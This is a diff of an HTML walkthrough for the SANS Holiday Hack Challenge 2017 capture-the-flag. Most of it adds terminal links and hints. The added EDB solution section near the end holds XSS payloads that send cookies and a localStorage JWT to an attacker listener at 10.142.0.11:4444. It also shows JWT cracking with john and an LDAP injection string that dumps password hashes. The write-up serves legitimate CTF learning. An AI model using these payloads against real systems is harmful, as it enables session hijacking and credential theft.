@@ -1090,13 +1090,18 @@ Identifying the least-popular browser is your noteworthy goal.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-1-1-2" name="sec-5-1-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal? What's the direct link to it?
+<a href="https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid">https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid</a>=&lt;UID&gt;
 </p>
+
+<div class="figure">
+<p><img src="./images/terminal-location-bounce.png" alt="terminal-location-bounce.png" />
+</p>
+<p><span class="figure-number">Figure 4:</span> In-game location of terminal</p>
+</div>
 </div>
 </li>
 
 <li><a id="goal" name="goal"></a><a id="sec-5-1-1-3" name="sec-5-1-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
-
 
 <p>
 The goal is to analyze a 'log file' and determine what the least popular browser.
@@ -1104,7 +1109,23 @@ The goal is to analyze a 'log file' and determine what the least popular browser
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-1-1-4" name="sec-5-1-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="hints" name="hints"></a><a id="sec-5-1-1-4" name="sec-5-1-1-4"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
+
+<p>
+<a href="https://twitter.com/SirMintsALot">Minty Candycane on Twitter has some hints</a>
+</p>
+<ul class="org-ul">
+<li><a href="https://twitter.com/SirMintsALot/status/938187811869487104">The more I live my life as a Linux command-line user, the more I see problems waiting to be solved with cut, sort, uniq, head, and tail.</a>
+</li>
+<li><a href="https://twitter.com/SirMintsALot/status/938188406546251777">Oh wow, @Sw4mp_f0x and @bluscreenofjeff did a great job on this Parsing for Pentesters series!</a>
+</li>
+<li><a href="https://twitter.com/SirMintsALot/status/938574395240366080">The only thing that last article didn't really help me with was <b>counting</b> unique lines. This post looks super helpful for that! <a href="https://unix.stackexchange.com/questions/170043/sort-and-count-number-of-occurrence-of-lines/263849">https://unix.stackexchange.com/questions/170043/sort-and-count-number-of-occurrence-of-lines/263849</a> … (it's even against web server logs, just the wrong field)</a>
+</li>
+</ul>
+</div>
+</li>
+
+<li><a id="approach" name="approach"></a><a id="sec-5-1-1-5" name="sec-5-1-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
 A directory listing shows that terminal contains a binary called 'runtoanswer',
@@ -1137,7 +1158,7 @@ since we just want the user-agents, we can split the log lines on the double quo
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-1-1-5" name="sec-5-1-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-1-1-6" name="sec-5-1-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
 My solution is to use the cut tool, along with sort and uniq to find the least popular browser.
@@ -1220,7 +1241,7 @@ TODO: AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-1-1-6" name="sec-5-1-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-1-1-7" name="sec-5-1-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
 
 <p>
 TODO: Any other, easier solutions?
@@ -1232,7 +1253,7 @@ We can RE the binary.
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-1-1-7" name="sec-5-1-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-1-1-8" name="sec-5-1-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 The most common issue appeared to be the result of not normalizing the different browser versions.
@@ -1264,7 +1285,7 @@ or like:
 </div>
 </li>
 
-<li><a id="loot" name="loot"></a><a id="sec-5-1-1-8" name="sec-5-1-1-8"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-1-1-9" name="sec-5-1-1-9"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
 
 <p>
 Anything interesting hidden on the system?
@@ -1490,7 +1511,11 @@ Identify the song whose popularity is the best.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-3-1-2" name="sec-5-3-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal? What's the direct link to it?
+Where was the terminal?
+</p>
+
+<p>
+<a href="https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=USER_ID</a>
 </p>
 </div>
 </li>
@@ -3812,6 +3837,83 @@ the hints or the blog posts?
 <p>
 Summarize the reference solution that we found
 </p>
+
+<p>
+My solution:
+</p>
+
+<p>
+This was a multi stage exploit.
+</p>
+
+<p>
+The first stage was XSS via the support request.
+</p>
+
+<p>
+First I used
+</p>
+
+<p>
+```
+</p>
+<p>
+http -v &#x2013;form &#x2013;proxy=<a href="http:socks5://@localhost:32080">http:socks5://@localhost:32080</a>  POST <a href="http://edb.northpolechristmastown.com/service">http://edb.northpolechristmastown.com/service</a> \
+uid=alabaster.snowball \
+email=alabaster.snowball@northpolechristmastown.com \
+message="&lt;IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+document.cookie\"&gt;&lt;/img&gt;"
+```
+</p>
+
+<p>
+Then i realized the cookie didn't help, and one needed the token mentioned in the html/javascript source:
+</p>
+
+<p>
+```
+</p>
+<p>
+http -v &#x2013;form &#x2013;proxy=<a href="http:socks5://@localhost:32080">http:socks5://@localhost:32080</a>  POST <a href="http://edb.northpolechristmastown.com/service">http://edb.northpolechristmastown.com/service</a> \
+uid=alabaster.snowball \
+email=alabaster.snowball@northpolechristmastown.com \
+message="&lt;IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"&gt;&lt;/img&gt;"
+```
+</p>
+
+<p>
+At that point we had the token I stored in [output/jwt](output/jwt) and used jwt2john.py and john to crack it.  The makefile in output shows the process:
+</p>
+
+<p>
+```
+jwt.john: ../tools/jwt2john.py jwt
+        python3 ../tools/jwt2john.py $(shell cat jwt) &gt; jwt.john
+</p>
+
+<p>
+john.txt: jwt.john
+        john  &#x2013;format=HMAC-SHA256 jwt.john
+        john  &#x2013;format=HMAC-SHA256 jwt.john -show &gt; john.txt
+```
+</p>
+
+<p>
+Once logged in, [tools/edb.py](tools/edb.py) was used to exploit the ldap injection vuln using the search string
+</p>
+
+<p>
+name=))(department=it)(|(cn=
+</p>
+
+<p>
+and by passing * as the attributes query field. With that query and all
+attributes it is able to grab the entire ldap database including password
+hashes.
+</p>
+
+<p>
+The letter page requires a valid password, convienently a google search for santas md5 password quickly finds a valid password.
+</p>
 </div>
 </li>
 
@@ -3827,6 +3929,14 @@ Any other, easier solutions?
 
 <p>
 Do we know what issue(s) people were running into?
+</p>
+
+<p>
+Cracking the JWT key was tricky without the propper tools.
+My first python based solution was broken.  A fixed version was too slow.
+running it using pypy helped a bit, but the pyjwt library is not optimized for cracking.
+<a href="https://github.com/lmammino/jwt-cracker">https://github.com/lmammino/jwt-cracker</a> was a bit faster, but john outperformed
+everything.  The hard part was finding out how to use john to crack a jwt secret key.
 </p>
 </div>
 </li>
